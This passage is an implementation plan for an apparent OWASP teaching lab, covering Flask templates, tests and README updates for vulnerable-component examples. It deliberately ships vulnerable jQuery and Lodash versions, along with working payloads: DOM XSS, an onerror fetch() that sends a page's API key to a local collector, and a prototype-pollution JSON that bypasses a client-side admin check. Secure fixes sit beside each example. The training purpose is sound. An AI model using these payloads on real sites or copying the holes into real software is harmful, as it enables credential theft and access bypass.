  // attacker-controlled keys -- including "constructor.prototype" -- onto
  // Object.prototype itself (CVE-2019-10744), not just the local object.
  var merged = _.defaultsDeep({}, DEFAULT_PREFS, userPrefs);
});
{% endblock %}

{% block secure_code %}// Upgrade Lodash past 4.17.12 (the actual fix), AND never deep-merge
// untrusted input directly -- validate against an explicit allowlist of
// keys, or strip "__proto__"/"constructor"/"prototype" before merging:
var ALLOWED_KEYS = ["theme", "notifications"];
var userPrefs = JSON.parse(raw);
var safePrefs = {};
ALLOWED_KEYS.forEach(function (key) {
  if (Object.prototype.hasOwnProperty.call(userPrefs, key)) {
    safePrefs[key] = userPrefs[key];
  }
});
var merged = _.defaultsDeep({}, DEFAULT_PREFS, safePrefs);
{% endblock %}

{% block live_example %}
<p>Try it:</p>
<div class="mb-2">
  <textarea id="prefs-json" class="form-control" rows="3">{"theme": "dark"}</textarea>
</div>
<button type="button" id="apply-btn" class="btn btn-primary mb-2">Apply</button>
<p id="prefs-error" class="text-danger"></p>
<p>Applied theme: <span id="applied-theme">(none yet)</span></p>
<p>Fresh object check (<code>({}).isAdmin</code>): <span id="fresh-object-isadmin">(none yet)</span></p>

<script src="{{ url_for('static', filename='vendor/lodash-vulnerable/lodash-4.17.11.js') }}"></script>
<script>
  var DEFAULT_PREFS = { theme: "light", notifications: "digest" };
  document.getElementById('apply-btn').addEventListener('click', function () {
    var errorEl = document.getElementById('prefs-error');
    errorEl.textContent = '';
    try {
      var raw = document.getElementById('prefs-json').value;
      var userPrefs = JSON.parse(raw);
      // VULNERABLE: _.defaultsDeep() on Lodash < 4.17.12 recursively merges
      // attacker-controlled keys -- including "constructor.prototype" --
      // onto Object.prototype itself (CVE-2019-10744), not just the local
      // object.
      var merged = _.defaultsDeep({}, DEFAULT_PREFS, userPrefs);
      document.getElementById('applied-theme').textContent = merged.theme;
      var freshCheck = {};
      document.getElementById('fresh-object-isadmin').textContent = String(freshCheck.isAdmin);
    } catch (e) {
      errorEl.textContent = 'Invalid JSON: ' + e.message;
    }
  });
</script>
{% endblock %}
```

- [ ] **Step 7: Run tests to verify they pass**

Run: `.venv/bin/pytest tests/test_a06_lodash_prototype_pollution.py -v`
Expected: PASS (3 passed)

- [ ] **Step 8: Commit**

```bash
git add static/vendor/lodash-vulnerable app/categories/a06_vulnerable_components tests/test_a06_lodash_prototype_pollution.py
git commit -m "feat(a06): vendor Lodash 4.17.11 and add prototype-pollution example (CVE-2019-10744)"
```

---

## Task 5: Example 5 (jQuery DOM XSS Chained to Session Token Theft, Hard)

**Files:**
- Modify: `app/categories/a06_vulnerable_components/routes.py`
- Modify: `app/categories/a06_vulnerable_components/__init__.py`
- Create: `app/categories/a06_vulnerable_components/templates/a06_vulnerable_components/account_preview.html`
- Test: `tests/test_a06_jquery_session_theft.py`

**Interfaces:**
- Consumes: `a06_bp` from Task 1, vendored
  `static/vendor/jquery-vulnerable/jquery-1.12.4.js` from Task 2.
- Produces: Route endpoint `a06_vulnerable_components.account_preview` →
  `GET /a06/account-preview`.

- [ ] **Step 1: Write the failing test**

Create `tests/test_a06_jquery_session_theft.py`:

```python
def test_account_preview_page_renders(client):
    response = client.get("/a06/account-preview")
    assert response.status_code == 200
    body = response.data.decode()
    assert "api-key-value" in body
    assert "sk_live_4f8a2c91b3d7e0f6a1c5" in body
    assert "vendor/jquery-vulnerable/jquery-1.12.4.js" in body


def test_account_preview_wires_up_the_same_vulnerable_html_call(client):
    response = client.get("/a06/account-preview")
    body = response.data.decode()
    assert "vendor/jquery-vulnerable/jquery-1.12.4.js" in body
    assert "$('#comment-preview').html(raw)" in body
    assert "jquery-vulnerable/jquery-3" not in body


def test_account_preview_shows_the_python_collector_command(client):
    response = client.get("/a06/account-preview")
    body = response.data.decode()
    assert "python3 -m http.server 9000" in body
```

- [ ] **Step 2: Run test to verify it fails**

Run: `.venv/bin/pytest tests/test_a06_jquery_session_theft.py -v`
Expected: FAIL — 404 (no route yet).

- [ ] **Step 3: Add the route**

Modify `app/categories/a06_vulnerable_components/routes.py` — after the
`notification_preferences` route, add:

```python


@a06_bp.route("/account-preview")
def account_preview():
    return render_template("a06_vulnerable_components/account_preview.html")
```

- [ ] **Step 4: Add the ExampleNav entry**

Modify `app/categories/a06_vulnerable_components/__init__.py` — in the
`examples=[...]` list, after the `lodash-prototype-pollution` entry, add:

```python
            ExampleNav(
                id="jquery-xss-session-theft",
                title="jQuery DOM XSS Chained to Session Token Theft",
                group="Vulnerable Library: jQuery HTML Sanitization Bypass",
                difficulty="Hard",
                endpoint="a06_vulnerable_components.account_preview",
            ),
```

- [ ] **Step 5: Create the template**

Create `app/categories/a06_vulnerable_components/templates/a06_vulnerable_components/account_preview.html`:

```html
{% extends "core/example_page_base.html" %}
{% set example_title = "jQuery DOM XSS Chained to Session Token Theft" %}
{% set example_difficulty = "Hard" %}
{% set code_language = "html" %}
{% block title %}{{ example_title }} — A06{% endblock %}

{% block explanation %}
<p>
  This "Account" page reuses the same comment-preview widget from the
  "jQuery DOM XSS" example — the same vendored, vulnerable jQuery 1.12.4,
  the same flawed <code>htmlPrefilter</code>, the same <code>.html()</code>
  call. The only difference here is what's worth stealing: this page also
  displays your API key directly in the DOM, right next to the vulnerable
  preview widget.
</p>
{% endblock %}

{% block detect %}
<p>
  Same detection as the "jQuery DOM XSS" example — the vulnerability is
  identical. What changes here is the consequence: a real attacker doesn't
  stop at proving a script can run, they use that script execution to
  grab whatever's valuable on the page.
</p>
{% endblock %}

{% block exploitation %}
<p>
  First, start a listener to act as the attacker's collector, in a
  separate terminal:
</p>
<pre><code class="language-bash">python3 -m http.server 9000</code></pre>
<p>Then paste this exact payload into the comment box and click Preview:</p>
<pre><code class="language-html">&lt;style&gt;&lt;style /&gt;&lt;img src=1 onerror="fetch('http://127.0.0.1:9000/collect?key=' + encodeURIComponent(document.getElementById('api-key-value').innerText))"&gt;</code></pre>
<p>
  Watch the terminal running <code>python3 -m http.server 9000</code> —
  its access log shows a real GET request for
  <code>/collect?key=sk_live_...</code>, carrying your API key, sent by
  your own browser to a completely different process, with no further
  interaction from you. The same DOM-XSS bug from the "jQuery DOM XSS"
  example, now demonstrated at real-world severity: this is exactly how
  a stored or reflected version of this bug would exfiltrate a real
  session token or API credential to an attacker who never touched your
  browser directly.
</p>
{% endblock %}

{% block vulnerable_code %}&lt;div id="account-panel"&gt;
  &lt;p&gt;Your API Key: &lt;span id="api-key-value"&gt;sk_live_4f8a2c91b3d7e0f6a1c5&lt;/span&gt;&lt;/p&gt;
&lt;/div&gt;

&lt;script&gt;
$('#preview-btn').on('click', function () {
  var raw = $('#comment-input').val();
  // VULNERABLE: same flawed jQuery htmlPrefilter as the Medium-tier
  // example, but now this page also has a real secret worth stealing
  // sitting in the DOM right next to it.
  $('#comment-preview').html(raw);
});
&lt;/script&gt;
{% endblock %}

{% block secure_code %}&lt;!-- Never render a real secret directly into client-reachable markup.
     If a partial value must be shown, truncate it server-side before
     ever sending it to the browser: --&gt;
&lt;p&gt;Your API Key ends in: &lt;span&gt;...c5c5&lt;/span&gt;&lt;/p&gt;
&lt;!-- PLUS the same jQuery fix as the Medium-tier example: upgrade past
     3.5.0, and never trust a library to sanitize untrusted HTML alone. --&gt;
{% endblock %}

{% block live_example %}
<div id="account-panel" class="mb-3">
  <p>Your API Key: <span id="api-key-value">sk_live_4f8a2c91b3d7e0f6a1c5</span></p>
</div>
<p>Try it:</p>
<div class="mb-2">
  <textarea id="comment-input" class="form-control" rows="3" placeholder="Type your comment..."></textarea>
</div>
<button type="button" id="preview-btn" class="btn btn-primary mb-2">Preview</button>
<div id="comment-preview" class="border rounded p-2 bg-body-secondary"></div>

<script src="{{ url_for('static', filename='vendor/jquery-vulnerable/jquery-1.12.4.js') }}"></script>
<script>
  $('#preview-btn').on('click', function () {
    var raw = $('#comment-input').val();
    // VULNERABLE: same flawed jQuery htmlPrefilter as the Medium-tier
    // example, but now this page also has a real secret worth stealing
    // sitting in the DOM right next to it.
    $('#comment-preview').html(raw);
  });
</script>
{% endblock %}
```

- [ ] **Step 6: Run tests to verify they pass**

Run: `.venv/bin/pytest tests/test_a06_jquery_session_theft.py -v`
Expected: PASS (3 passed)

- [ ] **Step 7: Commit**

```bash
git add app/categories/a06_vulnerable_components tests/test_a06_jquery_session_theft.py
git commit -m "feat(a06): add jQuery XSS session-theft example"
```

---

## Task 6: Example 6 (Prototype Pollution Bypasses a Client-Side Access Check, Hard)

**Files:**
- Modify: `app/categories/a06_vulnerable_components/routes.py`
- Modify: `app/categories/a06_vulnerable_components/__init__.py`
- Create: `app/categories/a06_vulnerable_components/templates/a06_vulnerable_components/admin_tools_panel.html`
- Test: `tests/test_a06_prototype_pollution_bypass.py`

**Interfaces:**
- Consumes: `a06_bp` from Task 1, vendored
  `static/vendor/lodash-vulnerable/lodash-4.17.11.js` from Task 4.
- Produces: Route endpoint `a06_vulnerable_components.admin_tools_panel` →
  `GET /a06/admin-tools-panel`.

- [ ] **Step 1: Write the failing test**

Create `tests/test_a06_prototype_pollution_bypass.py`:

```python
def test_admin_tools_panel_page_renders(client):
    response = client.get("/a06/admin-tools-panel")
    assert response.status_code == 200
    body = response.data.decode()
    assert "admin-tools-panel" in body
    assert "vendor/lodash-vulnerable/lodash-4.17.11.js" in body


def test_admin_tools_panel_is_hidden_by_default(client):
    response = client.get("/a06/admin-tools-panel")
    body = response.data.decode()
    assert 'id="admin-tools-panel"' in body
    assert 'style="display:none"' in body


def test_admin_tools_panel_wires_up_the_same_vulnerable_defaults_deep_call(client):
    response = client.get("/a06/admin-tools-panel")
    body = response.data.decode()
    assert "vendor/lodash-vulnerable/lodash-4.17.11.js" in body
    assert "_.defaultsDeep({}, DEFAULT_PREFS, userPrefs)" in body
    assert "checkAdminAccess" in body
```

- [ ] **Step 2: Run test to verify it fails**

Run: `.venv/bin/pytest tests/test_a06_prototype_pollution_bypass.py -v`
Expected: FAIL — 404 (no route yet).

- [ ] **Step 3: Add the route**

Modify `app/categories/a06_vulnerable_components/routes.py` — after the
`account_preview` route, add:

```python


@a06_bp.route("/admin-tools-panel")
def admin_tools_panel():
    return render_template("a06_vulnerable_components/admin_tools_panel.html")
```

- [ ] **Step 4: Add the ExampleNav entry**

Modify `app/categories/a06_vulnerable_components/__init__.py` — in the
`examples=[...]` list, after the `jquery-xss-session-theft` entry, add:

```python
            ExampleNav(
                id="prototype-pollution-bypass",
                title="Prototype Pollution Bypasses a Client-Side Access Check",
                group="Vulnerable Library: Lodash Prototype Pollution",
                difficulty="Hard",
                endpoint="a06_vulnerable_components.admin_tools_panel",
            ),
```

- [ ] **Step 5: Create the template**

Create `app/categories/a06_vulnerable_components/templates/a06_vulnerable_components/admin_tools_panel.html`:

```html
{% extends "core/example_page_base.html" %}
{% set example_title = "Prototype Pollution Bypasses a Client-Side Access Check" %}
{% set example_difficulty = "Hard" %}
{% set code_language = "html" %}
{% block title %}{{ example_title }} — A06{% endblock %}

{% block explanation %}
<p>
  This page reuses the same "Notification Preferences" feature from the
  "Lodash Prototype Pollution" example — same vendored, vulnerable Lodash
  4.17.11, same <code>_.defaultsDeep()</code> call. The only difference
  here is what reads the polluted property: this page has a hidden "Admin
  Tools" section, gated by a real (if naive) client-side access check.
</p>
{% endblock %}

{% block detect %}
<p>
  Same detection as the "Lodash Prototype Pollution" example — the bug is
  identical. What changes here is the consequence: instead of just proving
  a decorative "fresh object" flag flips, the same pollution flips a check
  that's actually gating a real (if fake, for this demo) piece of
  functionality.
</p>
{% endblock %}

{% block exploitation %}
<p>Paste this exact payload into the preferences box and click Apply:</p>
<pre><code class="language-json">{"constructor": {"prototype": {"isAdmin": true}}}</code></pre>
<p>
  Watch the hidden "Admin Tools" section below appear. Its visibility is
  controlled entirely by a client-side check —
  <code>if (({}).isAdmin) { showPanel(); }</code> — against a freshly
  created, empty object. Once <code>Object.prototype.isAdmin</code> is
  polluted, <em>every</em> such check across the entire page starts
  passing, including ones that were never meant to be attacker-reachable
  at all. This is the real-world severity of prototype pollution: it
  doesn't just corrupt data, it can silently flip any access check
  written the same naive way.
</p>
{% endblock %}

{% block vulnerable_code %}&lt;div id="admin-tools-panel" style="display:none"&gt;
  &lt;h3&gt;Admin Tools&lt;/h3&gt;
  &lt;p&gt;Fake internal ops controls: user export, force-logout-all, audit log.&lt;/p&gt;
&lt;/div&gt;

&lt;script&gt;
function checkAdminAccess() {
  var sessionFlags = {}; // fresh object -- inherits from (possibly
                          // polluted) Object.prototype
  if (sessionFlags.isAdmin) {
    document.getElementById('admin-tools-panel').style.display = 'block';
  }
}
&lt;/script&gt;
{% endblock %}

{% block secure_code %}&lt;!-- Same fix as the Medium-tier example (upgrade Lodash, allowlist
     merge keys), PLUS: never gate real functionality on a client-side
     check alone -- a client can always be tampered with. Any access
     decision that matters must be enforced server-side, on every
     request: --&gt;
@app.route("/admin/tools")
@require_admin
def admin_tools():
    ...
{% endblock %}

{% block live_example %}
<div class="mb-2">
  <textarea id="prefs-json" class="form-control" rows="3">{"theme": "dark"}</textarea>
</div>
<button type="button" id="apply-btn" class="btn btn-primary mb-2">Apply</button>
<p id="prefs-error" class="text-danger"></p>
<p>Applied theme: <span id="applied-theme">(none yet)</span></p>

<div id="admin-tools-panel" class="border rounded p-2 bg-body-secondary" style="display:none">
  <h3>Admin Tools</h3>
  <p>Fake internal ops controls: user export, force-logout-all, audit log.</p>
</div>

<script src="{{ url_for('static', filename='vendor/lodash-vulnerable/lodash-4.17.11.js') }}"></script>
<script>
  var DEFAULT_PREFS = { theme: "light", notifications: "digest" };

  function checkAdminAccess() {
    var sessionFlags = {}; // fresh object -- inherits from (possibly
                            // polluted) Object.prototype
    if (sessionFlags.isAdmin) {
      document.getElementById('admin-tools-panel').style.display = 'block';
    }
  }

  document.getElementById('apply-btn').addEventListener('click', function () {
    var errorEl = document.getElementById('prefs-error');
    errorEl.textContent = '';
    try {
      var raw = document.getElementById('prefs-json').value;
      var userPrefs = JSON.parse(raw);
      // VULNERABLE: same flawed _.defaultsDeep() as the Medium-tier
      // example -- but this page's checkAdminAccess() reads a property
      // off a fresh object, and that property can now be polluted too.
      var merged = _.defaultsDeep({}, DEFAULT_PREFS, userPrefs);
      document.getElementById('applied-theme').textContent = merged.theme;
      checkAdminAccess();
    } catch (e) {
      errorEl.textContent = 'Invalid JSON: ' + e.message;
    }
  });
</script>
{% endblock %}
```

- [ ] **Step 6: Run tests to verify they pass**

Run: `.venv/bin/pytest tests/test_a06_prototype_pollution_bypass.py -v`
Expected: PASS (3 passed)

- [ ] **Step 7: Commit**

```bash
git add app/categories/a06_vulnerable_components tests/test_a06_prototype_pollution_bypass.py
git commit -m "feat(a06): add prototype-pollution access-bypass example"
```

---

## Task 7: Final Integration — README, Overview Tests, and Live Browser Verification

**Files:**
- Modify: `README.md`
- Test: `tests/test_a06_overview.py`

**Interfaces:**
- Consumes: All six examples and the `CategoryNav` from Tasks 1–6.

- [ ] **Step 1: Write the overview/nav tests**

Create `tests/test_a06_overview.py`:

```python
def test_a06_overview_renders(client):
    response = client.get("/a06/")
    assert response.status_code == 200
    assert b"Vulnerable and Outdated Components" in response.data
    assert b"mermaid" in response.data
    assert b"language-python" in response.data


def test_a06_registered_in_nav(app):
    from app.core.nav import CATEGORIES

    a06 = next(c for c in CATEGORIES if c.id == "a06_vulnerable_components")
    assert a06.short_id == "A06"
    assert [e.difficulty for e in a06.examples] == [
        "Easy",
        "Easy",
        "Medium",
        "Medium",
        "Hard",
        "Hard",
    ]


def test_a06_examples_grouped_by_vulnerability_subtype(app):
    from app.core.nav import CATEGORIES

    a06 = next(c for c in CATEGORIES if c.id == "a06_vulnerable_components")
    grouped = a06.grouped_examples()
    assert [name for name, _ in grouped] == [
        "Component Reconnaissance",
        "Vulnerable Library: jQuery HTML Sanitization Bypass",
        "Vulnerable Library: Lodash Prototype Pollution",
    ]
    assert [e.id for e in grouped[0][1]] == ["version-disclosure", "outdated-jquery-detection"]
    assert [e.id for e in grouped[1][1]] == ["jquery-dom-xss", "jquery-xss-session-theft"]
    assert [e.id for e in grouped[2][1]] == ["lodash-prototype-pollution", "prototype-pollution-bypass"]
    difficulty_rank = {"Easy": 0, "Medium": 1, "Hard": 2}
    for _, examples in grouped:
        ranks = [difficulty_rank[e.difficulty] for e in examples]
        assert ranks == sorted(ranks), "group examples must be Easy-to-Hard"


def test_a06_overview_shows_vulnerability_subtype_group_headings(client):
    response = client.get("/a06/")
    body = response.data.decode()
    assert "Component Reconnaissance" in body
    assert "Vulnerable Library: jQuery HTML Sanitization Bypass" in body
    assert "Vulnerable Library: Lodash Prototype Pollution" in body
```

- [ ] **Step 2: Run tests to verify they pass**

Run: `.venv/bin/pytest tests/test_a06_overview.py -v`
Expected: PASS (4 passed)

- [ ] **Step 3: Run the full test suite**

Run: `.venv/bin/pytest tests/ -v`
Expected: all tests pass (283 pre-existing + this plan's new tests: 2 + 3 +
3 + 3 + 3 + 3 + 4 = 21 new tests → 304 total).

- [ ] **Step 4: Update README.md's intro paragraph**

Modify `README.md` — replace the "Currently implemented" paragraph
(currently ending "...and **A04 Insecure Design** (unlimited coupon reuse,
negative-quantity price manipulation, multi-step checkout bypass). Remaining
categories (A06–A10) are tracked separately and follow the same pattern.")
with:

```markdown
Currently implemented: **A01 Broken Access Control** (IDOR, missing function-level
authorization, mass assignment / role escalation), **A02 Cryptographic Failures**
(leaked credential dump, weak ECB encryption, predictable password-reset token),
**A03 Injection** (SQL injection auth bypass, UNION-based exfiltration, reflected XSS,
blind time-based SQLi, OS command injection, stored XSS, XXE file disclosure, XXE SSRF),
**A04 Insecure Design** (unlimited coupon reuse, negative-quantity price manipulation,
multi-step checkout bypass), **A05 Security Misconfiguration** (exposed database backup,
directory listing, verbose error disclosure, permissive CORS with credentials, exposed
debug console, forgotten admin panel with default credentials), and **A06 Vulnerable
and Outdated Components** (component version disclosure, outdated JS library detection,
jQuery DOM XSS via a real CVE, jQuery XSS chained to session-token theft, Lodash
prototype pollution via a real CVE, prototype pollution bypassing a client-side access
check). Remaining categories (A07–A10) are tracked separately and follow the same
pattern.
```

- [ ] **Step 5: Update README.md's category summary table**

Modify `README.md` — replace the line:

```
| A06–A10 | Planned | See `docs/superpowers/specs/2026-09-18-owasp-lab-design.md` |
```

with:

```
| A06 Vulnerable and Outdated Components | Implemented | Component Version Disclosure (Easy), Outdated Vulnerable JS Library Detection (Easy), jQuery DOM XSS via Vulnerable htmlPrefilter (Medium), Lodash Prototype Pollution via _.defaultsDeep() (Medium), jQuery DOM XSS Chained to Session Token Theft (Hard), Prototype Pollution Bypasses a Client-Side Access Check (Hard) |
| A07–A10 | Planned | See `docs/superpowers/specs/2026-09-18-owasp-lab-design.md` |
```

- [ ] **Step 6: Commit the README and overview-test changes**

```bash
git add README.md tests/test_a06_overview.py
git commit -m "docs(a06): update README and add overview/nav tests for A06"
```

- [ ] **Step 7: Live Docker + browser verification (controller-performed, not delegated)**

This step needs real browser JavaScript execution, which no dispatched
implementer subagent has tool access to. If this task is executed via
subagent-driven-development, the controller must perform this step itself
after the implementer's report, not delegate it. If executing inline, do it
directly.

```bash
docker compose up --build -d
```

Wait for the stack to be healthy (`docker compose ps`, or poll
`curl http://127.0.0.1:5001/healthz` until it returns `{"status": "ok"}`),
then using real browser tooling:

1. Navigate to `http://127.0.0.1:5001/a06/comment-preview`. Paste the exact
   payload `<style><style /><img src=1 onerror=alert(document.domain)>`
   into the textarea and click Preview. Confirm a real `alert()` dialog
   fires (or, since JS-triggered `alert()` dialogs block automation tools,
   swap in a non-blocking proof for this check specifically — e.g. temporarily
   using `onerror=document.title='XSS-FIRED'` instead of `alert(...)` when
   verifying via an automated browser tool — then confirm the real
   `alert(document.domain)` payload as written in the template is what
   ships, since a human running this exercise interactively does not hit
   the same dialog-blocking constraint).
2. Navigate to `http://127.0.0.1:5001/a06/notification-preferences`. Paste
   `{"constructor": {"prototype": {"isAdmin": true}}}` into the textarea and
   click Apply. Confirm the "Fresh object check" panel changes from
   `undefined` to `true`.
3. Navigate to `http://127.0.0.1:5001/a06/account-preview`. In a separate
   terminal, run `python3 -m http.server 9000`. Paste the session-theft
   payload from the template into the textarea and click Preview. Confirm
   the `python3 -m http.server 9000` terminal's access log shows a GET
   request for `/collect?key=sk_live_4f8a2c91b3d7e0f6a1c5`.
4. Navigate to `http://127.0.0.1:5001/a06/admin-tools-panel`. Confirm the
   "Admin Tools" section is hidden by default. Paste
   `{"constructor": {"prototype": {"isAdmin": true}}}` into the textarea and
   click Apply. Confirm the "Admin Tools" section becomes visible.

If any of the four fail to reproduce against the real running container
(as opposed to the earlier brainstorming-phase scratch verification), stop
and investigate — do not report this task complete on a failed live check.

```bash
docker compose down
```

No commit for this step — it's verification only, not a code change.
